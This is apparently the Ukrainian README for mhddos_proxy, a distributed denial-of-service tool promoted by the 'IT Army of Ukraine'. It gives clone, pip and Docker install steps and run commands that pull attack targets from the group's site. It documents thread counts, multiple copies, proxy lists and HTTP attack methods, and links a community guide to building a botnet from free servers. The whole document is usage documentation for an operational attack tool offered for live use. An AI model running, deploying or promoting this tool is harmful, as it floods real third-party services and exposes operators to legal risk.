## IT Army of Ukraine Official Tool 

### [English Version](/README-EN.md)

- [IT Army of Ukraine Official Tool ](#it-army-of-ukraine-official-tool-)
    - [⚠ Увага](#⚠-увага)
    - [Переваги](#переваги)
    - [⏱ Останні оновлення](#останні-оновлення)
    - [1. 💽 Варіанти встановлення](#1-варіанти-встановлення)
        - [A) Windows installer https://itarmy.com.ua/instruction/#mhddos/#windows](#a-windows-installer-httpsitarmycomuainstructionmhddoswindows)
        - [B) Python (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)](#b-python-якщо-не-працює---спробуйте-python-або-python310-замість-python3)
        - [C) Docker](#c-docker)
    - [2. 🕹 Запуск](#2-запуск)
        - [Python з автоматичним оновленням (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)](#python-з-автоматичним-оновленням-якщо-не-працює---спробуйте-python-або-python310-замість-python3)
        - [Python (потребує оновлення вручну) (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)](#python-потребує-оновлення-вручну-якщо-не-працює---спробуйте-python-або-python310-замість-python3)
        - [Docker (для Linux додавайте sudo на початку команди)](#docker-для-linux-додавайте-sudo-на-початку-команди)
    - [3. 🛠 Налаштування та параметри](#3-налаштування-та-параметри)
    - [4. 🐳 Комьюніті](#4-комьюніті)
    - [5. Власні проксі](#5-власні-проксі)
        - [Командний рядок](#командний-рядок)
        - [Формат файлу (будь який на вибір):](#формат-файлу-будь-який-на-вибір)

### ⚠ Увага
Відтепер для простоти встановлення, та захисту від несанкціонованого використання, **mhddos_proxy** буде розповсюджуватися у вигляді виконуваного файлу.    
[Перейдіть за посиланням для отримання інструкцій та завантаження](https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases)    
Усі оновлення та доступ до повної бази проксі будуть доступні лише в новій версії.  
Публічна версія (цей репозиторій) залишається доступним, проте не буде отримувати оновлень, окрім критичних.  
Додаткові пояснення в оф. каналі IT Army: https://t.me/itarmyofukraine2022/479  
Цей крок необхідний для нашої Перемоги. Слава Україні! 

### Переваги
- Вбудована база проксі з величезною кількістю IP по всьому світу
- Можливість задавати багато цілей з автоматичним балансуванням навантаження
- Безліч різноманітних методів
- Ефективне використання ресурсів завдяки асихронній архітектурі

### ⏱ Останні оновлення

- **27.06.2022** Додано іспанську локалізацію - параметр `--lang es`
- **22.06.2022** Покращено продуктивність роботи. Параметр `--debug` більше не підтримується через негативний вплив на продуктивність
- **10.06.2022** Додано зручний спосіб вказати власний проксі напряму в команді запуску (параметр `--proxy`)
- **08.06.2022** Додано налаштування `--copies auto` для автоматичного вибору значення з врахуванням доступних ресурсів

### 1. 💽 Варіанти встановлення

#### A) Windows installer https://itarmy.com.ua/instruction/#mhddos/#windows

#### B) Python (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

Потребує [Python](https://www.python.org/downloads/) та [Git](https://git-scm.com/download/)

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

#### C) Docker

Встановіть і запустіть Docker: https://docs.docker.com/desktop/#download-and-install

🕹 ### 2. Запуск



#### Python з автоматичним оновленням (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

    ./runner.sh python3 --itarmy
  
Для [**Termux for Android**](https://telegra.ph/mhddos-proxy-for-Android-with-Termux-03-31) ось так:
    
    TERMUX=1 bash runner.sh python --itarmy -t 1000

#### Python (потребує оновлення вручну) (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

    python3 runner.py --itarmy

#### Docker (для Linux додавайте sudo на початку команди)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:old --itarmy

### 3. 🛠 Налаштування та параметри

Усі параметри можна комбінувати і вказувати у довільному порядку

- Щоб додати ваш IP/VPN до атаки (особливо актуально для виділених серверів), додайте параметр `--vpn`
- Щоб обрати цілі від IT Army of Ukraine (https://itarmy.com.ua/), додайте параметр `--itarmy`
- Кількість потоків: `-t XXXX` - за замовчуванням 8000 (або 4000 якщо на машині лише 1 CPU)
- Запуск декількох копій: `--copies X` або `--copies auto`, при наявності 4+ CPU та мережі 100+ Mb/s

```
usage: runner.py [-t THREADS] [--copies COPIES] [--itarmy] [--lang {ua,en}] [--vpn]
                 [-c URL|path] [--proxies URL|path] [--proxy [PROXY ...]]
                 [--http-methods METHOD [METHOD ...]] [targets...]

  -h, --help             show all available options
  -t, --threads 8000     Number of threads (default is 8000 if CPU > 1, 4000 otherwise)
  --copies 1             Number of copies to run (default is 1). Use "auto" to set the value automatically
  --itarmy               Use targets from https://itarmy.com.ua/  
  --lang {ua,en,es}      Select language (default is ua)
  --vpn                  Use both my IP and proxies. Optionally, specify a chance of using my IP (default is 2%)
  -c, --config URL|path  URL or local path to file with targets list
  --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
  --proxy [PROXY ...]    List of proxies to use, separated by spaces
  --http-methods GET     List of HTTP(L7) methods to use (default is GET).

positional arguments:
   targets               List of targets, separated by space
```

### 4. 🐳 Комьюніті
- [Детальні (неофіційні) інструкції по встановленню](docs/installation.md)
- [Створення ботнету з 20+ безкоштовних серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [Cкрипти з автоматичним встановленням](https://t.me/ddos_separ/1126)
- [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)
- [Налаштування з нотифікаціями у Телеграм](https://github.com/sadviq99/mhddos_proxy-setup)

### 5. Власні проксі

#### Командний рядок

Для того щоб вказати власний проксі (або декілька) через командний рядок, використовуйте опцію `--proxy`:

    python3 runner.py --proxy socks4://114.231.123.38:3065

Можна вказати декілька проксі розділених пробілом:

    python3 runner.py --proxy socks4://114.231.123.38:3065 socks5://114.231.123.38:1080

Якщо перелік проксей занадто великий, скористайтеся опцією передачі налаштувань через файл (дивіться наступний розділ).

#### Формат файлу (будь який на вибір):

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

де `protocol` може бути одним з 3-ох: `http`|`socks4`|`socks5`, якщо `protocol`не вказувати, то буде обрано `http`  
наприклад для публічного проксі `socks4` формат буде таким:

    socks4://114.231.123.38:3065

а для приватного `socks4` формат може бути одним з таких:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065
  
**URL - Віддалений файл для Python та Docker**

    --proxies https://pastebin.com/raw/UkFWzLOt

де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
  
**path - Шлях до локального файлу, для Python**
  
Покладіть файл у папку з `runner.py` і додайте до команди наступний параметр (замініть `proxies.txt` на ім'я свого файлу)

    --proxies proxies.txt

де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
